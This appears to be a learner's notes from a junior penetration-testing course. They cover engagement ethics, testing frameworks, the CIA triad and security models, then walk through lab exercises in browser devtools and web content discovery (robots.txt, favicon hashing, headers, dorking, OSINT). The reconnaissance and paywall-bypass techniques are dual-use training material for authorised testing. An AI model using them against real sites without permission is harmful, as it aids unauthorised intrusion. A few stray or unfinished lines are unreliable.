---
title: Jr Penetratino Tester
published: true
tags: [cyber , Penetration Testing , Red Teaming]
---


This learning path covers the core technical skills that will allow you to succeed as a junior penetration tester. Upon completing this path, you will have the practical skills necessary to perform security assessments against web applications and enterprise infrastructure.

### Pre-Requisites:

- You need a basic understanding of fundamental computing principles and a broad understanding of the different areas of cyber security to complete this pathway. If you do not already have these prerequisites, complete the  [Pre-Security Pathway](https://tryhackme.com/path/outline/presecurity) and [Intro To Cyber Security Pathway](https://tryhackme.com/path/outline/introtocyber).


<div style="text-align: center;">
  <img src="https://raw.githubusercontent.com/MrP-cpu/MrP-cpu.github.io/main/assets/images/parts.png" alt="Parts diagram" style="max-width:100%; height:auto;">
  <p style="font-style: italic; color: gray;">Parts diagram used in the circuit</p>
</div>


-----

# Introduction to Pentesting

> [!Introduction]
> Understand what a penetration test involves, including testing techniques and methodologies every pentester should know.
> This module will teach you the various methodologies and testing techniques that every penetration tester should know. By the end of the module, you will be able to identify what framework best suits your pentest engagement and know what security policies are used to protect data from cyber threats; involving keeping data confidential, integral, and available.


### Pentesting Fundamentals
*|>Learn the important ethics and methodologies behind every pentest.*



#### **What is penetration testing?**
A Penetration test or pentest is an ethically-driven attempt to test and analyse the security defences to protect these assets and pieces of information. A penetration test involves using the same tools, techniques, and methodologies that someone with malicious intent would use and is similar to an audit.


#### **Penetration Testing Ethics**
penetration test is an **authorised audit** of a computer system's security and defences as agreed by the owners of the systems. The legality of penetration is pretty clear-cut in this sense; anything that falls outside of this agreement is deemed unauthorised.



| **Hat Category** | **Description**                                                                                                                       | **Example**                                                                                  |
| ---------------- | ------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------- |
| White Hat        | These hackers are considered the "good people". They remain within the law and use their skills to benefit others.                    | For example, a penetration tester performing an authorised engagement on a company.          |
| Grey Hat         | These people use their skills to benefit others often; however, they do not respect/follow the law or ethical standards at all times. | For example, someone taking down a scamming site.                                            |
| Black Hat        | These people  are criminals and often seek to damage organisations or gain some form of financial benefit at the cost of others.      | For example, ransomware authors infect devices with malicious code and hold data for ransom. |

**Rules of Engagement (ROE)**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/60c8baae098f1b1bbd9e0c440ea21a11.svg)  

The ROE is a document that is created at the initial stages of a penetration testing engagement. This document consists of three main sections (explained in the table below), which are ultimately responsible for deciding how the engagement is carried out. The SANS institute has a great example of this document which you can view online [here](https://sansorg.egnyte.com/dl/bF4I3yCcnt/?).



| **Section** | **Description**                                                                                                                                                                                                                                      |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Permission  | This section of the document gives explicit permission for the engagement to be carried out. This permission is essential to legally protect individuals and organisations for the activities they carry out.                                        |
| Test Scope  | This section of the document will annotate specific targets to which the engagement should apply. For example, the penetration test may only apply to certain servers or applications but not the entire network.                                    |
| Rules       | The rules section will define exactly the techniques that are permitted during the engagement. For example, the rules may specifically state that techniques such as phishing attacks are prohibited, but MITM (Man-in-the-Middle) attacks are okay. |

-----
#### Penetration Testing Methodologies

- can have a wide variety of objectives and targets within scope. Because of this, no penetration test is the same, and there are no one-case fits all as to how a penetration tester should approach it.
- The steps a penetration tester takes during an engagement is known as the methodology



| **Stage**             | **Description**                                                                                                                                                                                                                                                                                                                                                                  |
| --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Information Gathering | This stage involves collecting as much publically accessible information about a target/organisation as possible, for example, OSINT and research. <br><br>**Note:** This does not involve scanning any systems.                                                                                                                                                                 |
| Enumeration/Scanning  | This stage involves discovering applications and services running on the systems. For example, finding a web server that may be potentially vulnerable.                                                                                                                                                                                                                          |
| Exploitation          | This stage involves leveraging vulnerabilities discovered on a system or application. This stage can involve the use of public exploits or exploiting application logic.                                                                                                                                                                                                         |
| Privilege Escalation  | Once you have successfully exploited a system or application (known as a foothold), this stage is the attempt to expand your access to a system. You can escalate horizontally and vertically, where horizontally is accessing another account of the same permission group (i.e. another user), whereas vertically is that of another permission group (i.e. an administrator). |
| Post-exploitation     | This stage involves a few sub-stages:  <br><br>**1.** What other hosts can be targeted (pivoting)<br><br>**2.** What additional information can we gather from the host now that we are a privileged user<br><br>**3.**  Covering your tracks<br><br>**4.** Reporting                                                                                                            |


**OSSTMM**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/72a3a5b98b737f422f58b78e11e82646.png)

[The Open Source Security Testing Methodology Manual](https://www.isecom.org/OSSTMM.3.pdf) provides a detailed framework of testing strategies for systems, software, applications, communications and the human aspect of cybersecurity.

  

The methodology focuses primarily on how these systems, applications communicate, so it includes a methodology for:

1. **Telecommunications (phones, VoIP, etc.)**
2. Wired Networks
3. Wireless communications

|   |   |
|---|---|
|**Advantages**|**Disadvantages**|
|Covers various testing strategies in-depth.|The framework is difficult to understand, very detailed, and tends to use unique definitions.|
|Includes testing strategies for specific targets (I.e. telecommunications and networking)|_Intentionally left blank._|
|The framework is flexible depending upon the organisation's needs.|_Intentionally left blank._||
|The framework is meant to set a standard for systems and applications, meaning that a universal methodology can be used in a penetration testing scenario.|_Intentionally left blank._|

  

**OWASP**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/497e56c5522ca4932d720ae5fae32845.png)

  

The "[Open Web Application Security Project](https://owasp.org/)" framework is a community-driven and frequently updated framework used solely to test the security of web applications and services.

  

The foundation regularly [writes reports](https://owasp.org/www-project-top-ten/2017/) stating the top ten security vulnerabilities a web application may have, the testing approach, and remediation.

  

|   |   |
|---|---|
|**Advantages**|**Disadvantages**|
|Easy to pick up and understand.|It may not be clear what type of vulnerability a web application has (they can often overlap).|
|Actively maintained and is frequently updated.|OWASP does not make suggestions to any specific software development life cycles.|
|It covers all stages of an engagement: from testing to reporting and remediation.|The framework doesn't hold any accreditation such as CHECK.|
|Specialises in web applications and services.|_Intentionally left blank._|

  
  

**NIST Cybersecurity Framework 1.1**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/8e11f5fcfc8fc6429fe35682797e2a24.jpg)

  

The [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework) is a popular framework used to improve an organisations cybersecurity standards and manage the risk of cyber threats. This framework is a bit of an honourable mention because of its popularity and detail.

  

The framework provides guidelines on security controls & benchmarks for success for organisations from critical infrastructure (power plants, etc.) all through to commercial.  There is a limited section on a standard guideline for the methodology a penetration tester should take.

  

  

|   |   |
|---|---|
|**Advantages**|**Disadvantages**|
|The NIST Framework is estimated to be used by 50% of American organisations by 2020.|NIST has many iterations of frameworks, so it may be difficult to decide which one applies to your organisation.|
|The framework is extremely detailed in setting standards to help organisations mitigate the threat posed by cyber threats.|The NIST framework has weak auditing policies, making it difficult to determine how a breach occurred.|
|The framework is very frequently updated.|The framework does not consider cloud computing, which is quickly becoming increasingly popular for organisations.|
|NIST provides accreditation for organisations that use this framework.|_Intentionally left blank.  <br>_|
|The NIST framework is designed to be implemented alongside other frameworks.|_Intentionally left blank.  <br>_|

  

**NCSC CAF**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/6e10e0fd0b6020d42873c218e1d37044.png)

The [Cyber Assessment Framework](https://www.ncsc.gov.uk/collection/caf/caf-principles-and-guidance) (CAF) is an extensive framework of fourteen principles used to assess the risk of various cyber threats and an organisation's defences against these.

  

The framework applies to organisations considered to perform "vitally important services and activities" such as critical infrastructure, banking, and the likes. The framework mainly focuses on and assesses the following topics:

- Data security
- System security
- Identity and access control
- Resiliency
- Monitoring
- Response and recovery planning

  

|   |   |
|---|---|
|Advantages|Disadvantages|
|This framework is backed by a government cybersecurity agency.|The framework is still new in the industry, meaning that organisations haven't had much time to make the necessary changes to be suitable for it.|
|This framework provides accreditation.|The framework is based on principles and ideas and isn't as direct as having rules like some other frameworks.|
|This framework covers fourteen principles which range from security to response.|Intentionally left blank.|

#### Black box, White box, Grey box Penetration Testing

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/f151a3f248f18f0ef61111c601efdac1.svg)

There are three primary scopes when testing an application or service. Your understanding of your target will determine the level of testing that you perform in your penetration testing engagement. In this task, we'll cover these three different scopes of testing.

**Black-Box Testing**!

This testing process is a high-level process where the tester is not given any information about the inner workings of the application or service.

The tester acts as a regular user testing the functionality and interaction of the application or piece of software. This testing can involve interacting with the interface, i.e. buttons, and testing to see whether the intended result is returned. No knowledge of programming or understanding of the programme is necessary for this type of testing.

Black-Box testing significantly increases the amount of time spent during the information gathering and enumeration phase to understand the attack surface of the target.

  
  
**Grey-Box Testing**

This testing process is the most popular for things such as penetration testing. It is a combination of both black-box and white-box testing processes. The tester will have some **limited** knowledge of the internal components of the application or piece of software. Still, it will be interacting with the application as if it were a black-box scenario and then using their knowledge of the application to try and resolve issues as they find them.

With Grey-Box testing, the limited knowledge given saves time, and is often chosen for extremely well-hardened attack surfaces.

  

  

  

**White-Box Testing**!

This testing process is a low-level process usually done by a software developer who knows programming and application logic. The tester will be testing the internal components of the application or piece of software and, for example, ensuring that specific functions work correctly and within a reasonable amount of time.

The tester will have **full** knowledge of the application and its expected behaviour and is much more time consuming than black-box testing. The full knowledge in a White-Box testing scenario provides a testing approach that guarantees the entire attack surface can be validated.

  
#### Practical: ACME Penetration Test
![[Pasted image 20241103232147.png]]

![[Pasted image 20241103232200.png]]


![[Pasted image 20241103232214.png]]

![[Pasted image 20241103232256.png]]

![[Pasted image 20241103232304.png]]

![[Pasted image 20241103232317.png]]


![[Pasted image 20241103232334.png]]

![[Pasted image 20241103232349.png]]


---
### Principles of Security

Learn the principles of information security that secures data and protects systems from abuse


#### CIA Triad -> 
![[Pasted image 20241104024843.png]]
- information security model that is used to consideration thoroughout creating a security policy .
- **C**onfidentiality, **I**ntegrity and **A**vailability (**CIA**), this model has quickly become an industry standard today. This model should help determine the value of data that it applies to, and in turn, the attention it needs from the business.

![[Pasted image 20241104024850.png]]
**Confidentiality**

This element is the protection of data from unauthorized access and misuse. Organisations will always have some form of sensitive data stored on their systems. To provide confidentiality is to protect this data from parties that it is not intended for.

  

There are many real-world examples for this, for example, employee records and accounting documents will be considered sensitive. Confidentiality will be provided in the sense that only HR administrators will access employee records, where vetting and tight access controls are in place. Accounting records are less valuable (and therefore less sensitive), so not as stringent access controls would be in place for these documents. Or, for example, governments using a sensitivity classification rating system (top-secret, classified, unclassified)

  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/8baaae53303b90143e5cb20821202bd4.png)  

**Integrity**

The CIA triad element of integrity is the condition where information is kept accurate and consistent unless authorized changes are made. It is possible for the information to change because of careless access and use, errors in the information system, or unauthorized access and use. In the CIA triad, integrity is maintained when the information remains unchanged during storage, transmission, and usage not involving modification to the information. Steps must be taken to ensure data cannot be altered by unauthorised people (for example, in a breach of confidentiality).

  

Many defences to ensure integrity can be put in place. Access control and rigorous authentication can help prevent authorized users from making unauthorized changes. Hash verifications and digital signatures can help ensure that transactions are authentic and that files have not been modified or corrupted.

  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/d194e35fc5fd158b20e64a3c8c5123d1.png)  

**Availability**

In order for data to be useful, it must be available and accessible by the user.

  

The main concern in the CIA triad is that the information should be available when authorised users need to access it.

  

Availability is very often a key benchmark for an organisation. For example, having 99.99% uptime on their websites or systems (this is laid out in Service Level Agreements). When a system is unavailable, it often results in damage to an organisations reputation and loss of finances. Availability is achieved through a combination of many elements, including:

- Having reliable and well-tested hardware for their information technology servers (i.e. reputable servers)
- Having redundant technology and services in the case of failure of the primary
- Implementing well-versed security protocols to protect technology and services from attack



#### Principles of Privileges

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/b89ffd2bbfbdd7c3837508619ff7027f.png)  

It is vital to administrate and correctly define the various levels of access to an information technology system individuals require. 

The levels of access given to individuals are determined on two primary factors:

- The individual's role/function within the organisation
- The sensitivity of the information being stored on the system

  

Two key concepts are used to assign and manage the access rights of individuals: Privileged Identity Management (PIM) and Privileged Access Management (or PAM for short).

  

Initially, these two concepts can seem to overlap; however, they are different from one another. PIM is used to translate a user's role within an organisation into an access role on a system. Whereas PAM is the management of the privileges a system's access role has, amongst other things.

  

What is essential when discussing privilege and access controls is the principle of least privilege. Simply, users should be given the minimum amount of privileges, and only those that are absolutely necessary for them to perform their duties. Other people should be able to trust what people write to.

  

As we previously mentioned, PAM incorporates more than assigning access. It also encompasses enforcing security policies such as password management, auditing policies and reducing the attack surface a system faces.

#### Security Models Continued

Before discussing security models further, let's recall the three elements of the CIA triad: Confidentiality, Integrity and Availability. We've previously outlined what these elements are and their importance. However, there is a formal way of achieving this.

  

According to a security model, any system or piece of technology storing information is called an information system, which is how we will reference systems and devices in this task.

  

Let's explore some popular and effective security models used to achieve the three elements of the CIA triad.

  

  

**The Bell-La Padula M****odel**

The Bell-La Padula Model is used to achieve confidentiality. This model has a few assumptions, such as an organisation's hierarchical structure it is used in, where everyone's responsibilities/roles are well-defined.

  

The model works by granting access to pieces of data (called objects) on a strictly need to know basis. This model uses the rule "no write down, no read up".

  

|   |   |
|---|---|
|**Advantages**|**Disadvantages**|
|Policies in this model can be replicated to real-life organisations hierarchies (and vice versa)|Even though a user may not have access to an object, they will know about its existence -- so it's not confidential in that aspect.|
|Simple to implement and understand, and has been proven to be successful.|The model relies on a large amount of trust within the organisation.|

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/0e6e5d9d80785fc287b4a67e1453b295.png)

The Bell LaPadula Model is popular within organisations such as governmental and military. This is because members of the organisations are presumed to have already gone through a process called vetting. Vetting is a screening process where applicant's backgrounds are examined to establish the risk they pose to the organisation. Therefore, applicants who are successfully vetted are assumed to be trustworthy - which is where this model fits in.

  

**Biba Model**

The Biba model is arguably the equivalent of the Bell-La Padula model but for the integrity of the CIA triad.

  

This model applies the rule to objects (data) and subjects (users) that can be summarised as "no write up, no read down". This rule means that subjects **can** create or write content to objects at or below their level but **can only** read the contents of objects above the subject's level.

  

Let's compare some advantages and disadvantages of this model in the table below:

  

|   |   |
|---|---|
|**Advantages**|**Disadvantages**|
|This model is simple to implement.|There will be many levels of access and objects. Things can be easily overlooked when applying security controls.|
|Resolves the limitations of the Bell-La Padula model by addressing both confidentiality and data integrity.|Often results in delays within a business. For example, a doctor would not be able to read the notes made by a nurse in a hospital with this model.|

  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/895ba351ef24ef6495d290222e49470e.png)

The Biba model is used in organisations or situations where integrity is more important than confidentiality. For example, in software development, developers may only have access to the code that is necessary for their job. They may not need access to critical pieces of information such as databases, etc.


#### Threat Modelling & Incident Response

Threat modelling is the process of reviewing, improving, and testing the security protocols in place in an organisation's information technology infrastructure and services.

  

A critical stage of the threat modelling process is identifying likely threats that an application or system may face, the vulnerabilities a system or application may be vulnerable to.

  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/aabdd83977336fd44b3645a86e5ba20e.png)  

The threat modelling process is very similar to a risk assessment made in workplaces for employees and customers. The principles all return to:

- Preparation
- Identification
- Mitigations
- Review

  

It is, however, a complex process that needs constant review and discussion with a dedicated team. An effective threat model includes:

- Threat intelligence
- Asset identification
- Mitigation capabilities
- Risk assessment

  

To help with this, there are frameworks such as **STRIDE** (**S**poofing identity, **T**ampering with data, **R**epudiation threats, **I**nformation disclosure, **D**enial of Service and **E**levation of privileges) and **PASTA** (**P**rocess for **A**ttack **S**imulation and **T**hreat **A**nalysis) infosec never tasted so good!. Let's detail STRIDE below. STRIDE, authored by two Microsoft security researchers in 1999 is still very relevant today. STRIDE includes six main principles, which I have detailed in the table below:

  

  

|   |   |
|---|---|
|**Principle**|**Description**|
|Spoofing|This principle requires you to authenticate requests and users accessing a system. Spoofing involves a malicious party falsely identifying itself as another.<br><br>Access keys (such as API keys) or signatures via encryption helps remediate this threat.|
|Tampering|By providing anti-tampering measures to a system or application, you help provide integrity to the data. Data that is accessed must be kept integral and accurate.<br><br>For example, shops use seals on food products.|
|Repudiation|This principle dictates the use of services such as logging of activity for a system or application to track.|
|Information Disclosure|Applications or services that handle information of multiple users need to be appropriately configured to only show information relevant to the owner.|
|Denial of Service|Applications and services use up system resources, these two things should have measures in place so that abuse of the application/service won't result in bringing the whole system down.|
|Elevation of Privilege|This is the worst-case scenario for an application or service. It means that a user was able to escalate their authorization to that of a higher level i.e. an administrator. This scenario often leads to further exploitation or information disclosure.|

  

A breach of security is known as an incident. And despite all rigorous threat models and secure system designs, incidents do happen. Actions taken to resolve and remediate the threat are known as Incident Response (IR) and are a whole career path in cybersecurity.

  

Incidents are classified using a rating of urgency and impact. Urgency will be determined by the type of attack faced, where the impact will be determined by the affected system and what impact that has on business operations.

  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/ab0cc8478b0bce9a400187f559d36dd6.png)  

  

An incident is responded to by a **C**omputer **S**ecurity **I**ncident **R**esponse **T**eam (**CSIRT**) which is prearranged group of employees with technical knowledge about the systems and/or current incident. To successfully solve an incident, these steps are often referred to as the six phases of Incident Response that takes place, listed in the table below:

  

|                 |                                                                                                                                             |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| **Action**      | **Description**                                                                                                                             |
| Preparation     | Do we have the resources and plans in place to deal with the security incident?                                                             |
| Identification  | Has the threat and the threat actor been correctly identified in order for us to respond to?                                                |
| Containment     | Can the threat/security incident be contained to prevent other systems or users from being impacted?                                        |
| Eradication     | Remove the active threat.                                                                                                                   |
| Recovery        | Perform a full review of the impacted systems to return to business as usual operations.                                                    |
| Lessons Learned | What can be learnt from the incident? I.e. if it was due to a phishing email, employees should be trained better to detect phishing emails. |


------
# Introduction to Web Hacking


> [!introduction] introduction
> Get hands-on, learn about and exploit some of the most popular web application vulnerabilities seen in the industry today.
> 
> In this module you will learn about the most common web application vulnerabilities, understanding what makes it vulnerable and putting theory into practice by hacking website simulations. You will also be taught how to identify, exploit and prevent each vulnerability.


![[Pasted image 20241104032305.png]]


### Walking An Application

*Manually review a web application for security issues using only your browsers developer tools. Hacking with just your browser, no tools or scripts.*

![[Pasted image 20241104033253.png]]

#### Exploring The Website

As a penetration tester, your role when reviewing a website or web application is to discover features that could potentially be vulnerable and attempt to exploit them to assess whether or not they are. These features are usually parts of the website that require some interactivity with the user.  
  
Finding interactive portions of the website can be as easy as spotting a login form to manually reviewing the website's JavaScript. An excellent place to start is just with your browser exploring the website and noting down the individual pages/areas/features with a summary for each one.

An example site review for the Acme IT Support website would look something like this:

|   |   |   |
|---|---|---|
|**Feature**|**URL**|**Summary**|
|Home Page|/|This page contains a summary of what Acme IT Support does with a company photo of their staff.|
|Latest News|/news|This page contains a list of recently published news articles by the company, and each news article has a link with an id number, i.e. /news/article?id=1|
|News Article|/news/article?id=1|Displays the individual news article. Some articles seem to be blocked and reserved for premium customers only.|
|Contact Page|/contact|This page contains a form for customers to contact the company. It contains name, email and message input fields and a send button.|
|Customers|/customers|This link redirects to /customers/login.|
|Customer Login|/customers/login|This page contains a login form with username and password fields.|
|Customer Signup|/customers/signup|This page contains a user-signup form that consists of a username, email, password and password confirmation input fields.|
|Customer Reset Password|/customers/reset|Password reset form with an email address input field.|
|Customer Dashboard|/customers|This page contains a list of the user's tickets submitted to the IT support company and a "Create Ticket" button.|
|Create Ticket|/customers/ticket/new|This page contains a form with a textbox for entering the IT issue and a file upload option to create an IT support ticket.|
|Customer Account|/customers/account|This page allows the user to edit their username, email and password.|
|Customer Logout|/customers/logout|This link logs the user out of the customer area.|

We will start taking a deeper look into some of the pages we have discovered in the next task.


####  Viewing The Page Source

- page source is the human-readable code returned to our browser/client from the web server each time we make a request.
- returned code is made up of HTML ( HyperText Markup Language), CSS ( Cascading Style Sheets ) and JavaScript, and it's what tells our browser what content to display, how to show it and adds an element of interactivity with JavaScript.

![[Pasted image 20241104041913.png]]


![[Pasted image 20241104041656.png]]

![[Pasted image 20241104155020.png]]

for directory listing flag -> for that there is a /assets for there we are able to get the 



#### **Developer Tools**

Every modern browser includes developer tools; this is a tool kit used to aid web developers in debugging web applications and gives you a peek under the hood of a website to see what is going on. As a pentester, we can leverage these tools to provide us with a much better understanding of the web application. We're specifically focusing on three features of the developer tool kit, Inspector, Debugger and Network.

  

##### **Opening Developer Tools**

The way to access developer tools is different for every browser. If you're not sure how to access it, click the "View Site" button on the top right of this task to get instructions to how to access the tools for your browser.

  

##### **Inspecto****r**

The page source doesn't always represent what's shown on a webpage; this is because CSS, JavaScript and user interaction can change the content and style of the page, which means we need a way to view what's been displayed in the browser window at this exact time. Element inspector assists us with this by providing us with a live representation of what is currently on the website.

  

As well as viewing this live view, we can also edit and interact with the page elements, which is helpful for web developers to debug issues.

On the Acme IT Support website, click into the news section, where you'll see three news articles.

  

The first two articles are readable, but the third has been blocked with a floating notice above the content stating you have to be a premium customer to view the article. These floating boxes blocking the page contents are often referred to as paywalls as they put up a metaphorical wall in front of the content you wish to see until you pay.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/96b49cec6712a47c4ea986d26c6b7451.png)  

Right-clicking on the premium notice ( paywall ), you should be able to select the Inspect option from the menu, which opens the developer tools either on the bottom or right-hand side depending on your browser or preferences. You'll now see the elements/HTML that make up the website ( similar to the screenshots below ).

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/0e3f5c5c8dd02916d6fc2637461293a9.png)  

_(Click on the image to enlarge)_

Locate the `DIV` element with the class `premium-customer-blocker` and click on it. You'll see all the CSS styles in the styles box that apply to this element, such as `margin-top: 60px` and `text-align: center`. The style we're interested in is the `display: block`. If you click on the word `block`, you can type a value of your own choice. Try typing `none`, and this will make the box disappear, revealing the content underneath it and a flag. If the element didn't have a display field, you could click below the last style and add in your own. Have a play with the element inspector, and you'll see you can change any of the information on the website, including the content. Remember this is only edited on your browser window, and when you press refresh, everything will be back to normal.



![[Pasted image 20241105002112.png]]

#### Developer Tools - Debugger

intended for debugging JavaScript, and again is an excellent feature for web developers wanting to work out why something might not be working. But as penetration testers, it gives us the option of digging deep into the JavaScript code. In Firefox and Safari, this feature is called Debugger, but in Google Chrome, it's called Sources.'

so i noticed something related to the `contact` section , then we could view the source code , and in the `sources` section we could see that there is a `flash.min.js` and there is a function named `flash` and clicking that will inovke the 

![[Pasted image 20241106151409.png]]

This panel in the developer tools is intended for debugging JavaScript, and again is an excellent feature for web developers wanting to work out why something might not be working. But as penetration testers, it gives us the option of digging deep into the JavaScript code. In Firefox and Safari, this feature is called Debugger, but in Google Chrome, it's called Sources.

  

On the Acme IT Support website, click on the contact page, each time the page is loaded, you might notice a rapid flash of red on the screen. We're going to use the Debugger to work out what this red flash is and if it contains anything interesting. Debugging a red dot wouldn't be something you'd do in the real world as a penetration tester, but it does allow us to use this feature and get used to the Debugger.

  

In both browsers, on the left-hand side, you see a list of all the resources the current webpage is using. If you click into the assets folder, you'll see a file named flash.min.js. Clicking on this file displays the contents of the JavaScript file.

  

Many times when viewing javascript files, you'll notice that everything is on one line, which is because it has been minimised, which means all formatting ( tabs, spacing and newlines ) have been removed to make the file smaller. This file is no exception to this, and it has also been obfusticated, which makes it purposely difficult to read, so it can't be copied as easily by other developers.

  

We can return some of the formattings by using the "Pretty Print" option, which looks like two braces { } to make it a little more readable, although due to the obfustication, it's still difficult to comprehend what is going on with the file. If you scroll to the bottom of the flash.min.js file, you'll see the line: `flash['remove']();` 

  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/d76d0b263799865be55d6725cbeaf21b.png)  

_(Click on the image to enlarge)_  

  

This little bit of JavaScript is what is removing the red popup from the page. We can utilise another feature of debugger called **breakpoints**. These are points in the code that we can force the browser to stop processing the JavaScript and pause the current execution.

  

If you click the line number that contains the above code, you'll notice it turns blue; you've now inserted a breakpoint on this line. Now try refreshing the page, and you'll notice the red box stays on the page instead of disappearing, and it contains a flag
![[Pasted image 20241106151327.png]]


#### Developer Tools - Network

The network tab on the developer tools can be used to keep track of every external request a webpage makes. If you click on the Network tab and then refresh the page, you'll see all the files the page is requesting. 

  

Try doing this on the contact page; you can press the trash can icon to delete the list if it gets a bit overpopulated.

  

With the network tab open, try filling in the contact form and pressing the **Send Message** button. You'll notice an event in the network tab, and this is the form being submitted in the background using a method called AJAX. AJAX is a method for sending and receiving network data in a web application background without interfering by changing the current web page.

  

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/9ec0890f159397547950ea1822994443.png)  

  

![[Pasted image 20241106152352.png|Examine the new entry on the network tab that the contact form created and view the page the data was sent to in order to reveal a flag.]]


![[Pasted image 20241106152110.png]]


![[Pasted image 20241106152520.png|the flag we found in the preview section when we passed our values through the form and then there a section got created named]]




----

### Content Discovery

Learn the various ways of discovering hidden or private content on a webserver that could lead to new vulnerabilities.


 Content can be many things, a file, video, picture, backup, a website feature. When we talk about content discovery, we're not talking about the obvious things we can see on a website; it's the things that aren't immediately presented to us and that weren't always intended for public access.
- pages , portals intended for staff usage , older version of the website 


*There are three main ways of discovering content on a website which we'll cover. Manually, Automated and OSINT (Open-Source Intelligence).*

- while pinging the target we could understand about the target which is active now -> `ping 10.10.91.5`
- ![[Pasted image 20241107115056.png]]
- now lets move to the next topics -> 

#### Manual Discovery - Robots.txt

-  multiple places we can manually check on a website to start discovering more content.
- ![[Pasted image 20241107115432.png| so there is a some texts that are allowed on the website]]

> [!Robots.txt]
The robots.txt file is a document that tells search engines which pages they are and aren't allowed to show on their search engine results or ban specific search engines from crawling the website altogether. It can be common practice to restrict certain website areas so they aren't displayed in search engine results. These pages may be areas such as administration portals or files meant for the website's customers. This file gives us a great list of locations on the website that the owners don't want us to discover as penetration testers.

#### Manual Discovery - Favicon

**Favicon**
The favicon is a small icon displayed in the browser's address bar or tab used for branding a website.

![[Pasted image 20241107120049.png|https://wiki.owasp.org/index.php/OWASP_favicon_database]]

![[Pasted image 20241107120420.png]]

![[Pasted image 20241107120215.png|this is making sure that the favicon is there]]

`curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum`
![[Pasted image 20241107122835.png]]

![[Pasted image 20241107122926.png|this is the type of the framework that the database is using]]


#### Manual Discovery - Sitemap.xml

![[Pasted image 20241108121755.png]]



#### Manual Discovery - HTTP Headers 
**HTTP Headers**

When we make requests to the web server, the server returns various HTTP headers. These headers can sometimes contain useful information such as the webserver software and possibly the programming/scripting language in use.
Try running the below curl command against the web server, where the **-v**switch enables verbose mode, which will output the headers (there might be something interesting!).


![[Pasted image 20241108122433.png]]


#### Manual Discovery - Framework Stack
**Framework Stack**

Once you've established the framework of a website, either from the above favicon example or by looking for clues in the page source such as comments, copyright notices or credits, you can then locate the framework's website. From there, we can learn more about the software and other information, possibly leading to more content we can discover.

  

Looking at the page source of our Acme IT Support website ([http://10.10.83.120](http://10.10.83.120/)), you'll see a comment at the end of every page with a page load time and also a link to the framework's website, which is [https://static-labs.tryhackme.cloud/sites/thm-web-framework](https://static-labs.tryhackme.cloud/sites/thm-web-framework). Let's take a look at that website. Viewing the documentation page gives us the path of the framework's administration portal, which gives us a flag if viewed on the Acme IT Support website

![[Pasted image 20241108124548.png]]


![[Pasted image 20241108124608.png]]


#### OSINT - Google Hacking / Dorking

There are also external resources available that can help in discovering information about your target website; these resources are often referred to as OSINT or (Open-Source Intelligence) as they're freely available tools that collect information:

  

**Google Hacking / Dorking**

Google hacking / Dorking utilizes Google's advanced search engine features, which allow you to pick out custom content. You can, for instance, pick out results from a certain domain name using the **site:** filter, for example (site:[tryhackme.com](http://tryhackme.com/)) you can then match this up with certain search terms, say, for example, the word admin (site:tryhackme.com admin) this then would only return results from the [tryhackme.com](http://tryhackme.com/) website which contain the word admin in its content. You can combine multiple filters as well. Here is an example of more filters you can use:

|   |   |   |
|---|---|---|
|**Filter**|**Example**|**Description**|
|site|site:tryhackme.com|returns results only from the specified website address|
|inurl|inurl:admin|returns results that have the specified word in the URL|
|filetype|filetype:pdf|returns results which are a particular file extension|
|intitle|intitle:admin|returns results that contain the specified word in the title|

  

More information about google hacking can be found here: [https://en.wikipedia.org/wiki/Google_hacking](https://en.wikipedia.org/wiki/Google_hacking)



#### OSINT - Wappalyzer

**Wappalyzer**

Wappalyzer ([https://www.wappalyzer.com/](https://www.wappalyzer.com/)) is an online tool and browser extension that helps identify what technologies a website uses, such as frameworks, Content Management Systems (CMS), payment processors and much more, and it can even find version numbers as well.

#### OSINT - Wayback Machine

**Wayback Machine**

The Wayback Machine ([https://archive.org/web/](https://archive.org/web/)) is a historical archive of websites that dates back to the late 90s. You can search a domain name, and it will show you all the times the service scraped the web page and saved the contents. This service can help uncover old pages that may still be active on the current website.


#### OSINT - GitHub

**GitHub**

To understand GitHub, you first need to understand Git. Git is a **version control system** that tracks changes to files in a project. Working in a team is easier because you can see what each team member is editing and what changes they made to files. When users have finished making their changes, they commit them with a message and then push them back to a central location (repository) for the other users to then pull those changes to their local machines. GitHub is a hosted version of Git on the internet. Repositories can either be set to public or private and have various access controls. You can use GitHub's search feature to look for company names or website names to try and locate repositories belonging to your target. Once discovered, you may have access to source code, passwords or other content that you hadn't yet found.


#### OSINT - S3 Buckets
**S3 Buckets**

